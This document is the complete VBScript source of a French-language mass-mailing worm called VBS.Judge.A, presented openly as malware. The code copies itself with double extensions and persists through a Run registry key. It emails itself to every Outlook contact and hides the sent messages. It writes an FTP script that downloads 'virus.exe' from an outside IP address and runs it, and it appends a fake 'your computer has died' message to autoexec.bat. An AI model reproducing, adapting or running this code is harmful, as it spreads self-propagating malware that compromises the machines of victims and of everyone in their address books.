'VBS.Judge.A par Petik (c)2000

Dim fso,ws,file
Set fso  = CreateObject("Scripting.FileSystemObject")
Set ws   = CreateObject("WScript.Shell")
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbs      = file.ReadAll

DEBUT()
Sub DEBUT()
Set win  = fso.GetSpecialFolder(0)
Set c    = fso.GetFile(WScript.ScriptFullName)
c.Copy(win&"\WinGDI.EXE.vbs")
c.Copy("C:\Judge.TXT.vbs")
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\WinGDI",win&"\WinGDI.EXE.vbs"
EMAIL()
FTP()
AUTOEXEC()
TXT()
End Sub

Sub EMAIL()
If Not fso.FileExists("C:\Judge.txt") Then
Set OApp = CreateObject("Outlook.Application")
if oapp="Outlook" then
Set Mapi = OApp.GetNameSpace("MAPI")
For Each AddList In Mapi.AddressLists
If AddList.AddressEntries.Count <> 0 Then
For AddListCount = 1 To AddList.AddressEntries.Count 
Set AddListEntry = AddList.AddressEntries(AddListCount)
Set msg = OApp.CreateItem(0)
msg.To = AddListEntry.Address
msg.Subject = "BatMan, SpiderMan et les autres"
msg.Body = "La vraie histoire de ces justiciers"
msg.Attachments.Add "C:\Judge.TXT.vbs"
msg.DeleteAfterSubmit = True
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next
end if
End If
End Sub

Sub FTP()
If Not fso.FileExists("C:\Judge.txt") Then
Set bat  = fso.CreateTextFile(win&"\FTP.bat")
bat.WriteLine "@echo off"
bat.WriteLine "start ftp -i -v -s:C:\FTP.drv"
bat.close
Set drv  = fso.CreateTextFile("C:\FTP.drv")
drv.WriteLine "open"
drv.WriteLine "205.188.137.185"
drv.WriteLine "pentasm99"
drv.WriteLine "binary"
drv.WriteLine "lcd C:\"
drv.WriteLine "get virus.exe"
drv.WriteLine "bye"
drv.WriteLine "exit"
drv.close
ws.Run (win&"\FTP.bat")
End If
End Sub

Sub AUTOEXEC()
If Day(Now()) = 1 then
Set FileObj = CreateObject("Scripting.FileSystemObject")
file = "c:\autoexec.bat"
Set InStream= FileObj.OpenTextFile (file, 1, False, False)
TLine = Instream.Readall
Set autobat= FileObj.CreateTextFile (file, True, False)
autobat.write(tline)
autobat.WriteBlankLines(1)
autobat.WriteLine "@echo off"
autobat.WriteLine "cls"
autobat.WriteLine "echo."
autobat.WriteLine "echo."
autobat.WriteLine "echo VBS.Judge.A par PetiK (c)2000"
autobat.WriteLine "echo."
autobat.WriteLine "echo TON ORDINATEUR VIENT DE MOURIR"
autobat.WriteLine "pause"
End If
End Sub

Sub TXT()
Set ptk  = fso.CreateTextFile("C:\Judge.txt")
ptk.WriteLine "Si vous lisez ce texte,"
ptk.WriteLine "c'est que vous avez eu le Ver VBS.Judge.A"
ptk.Close
End Sub
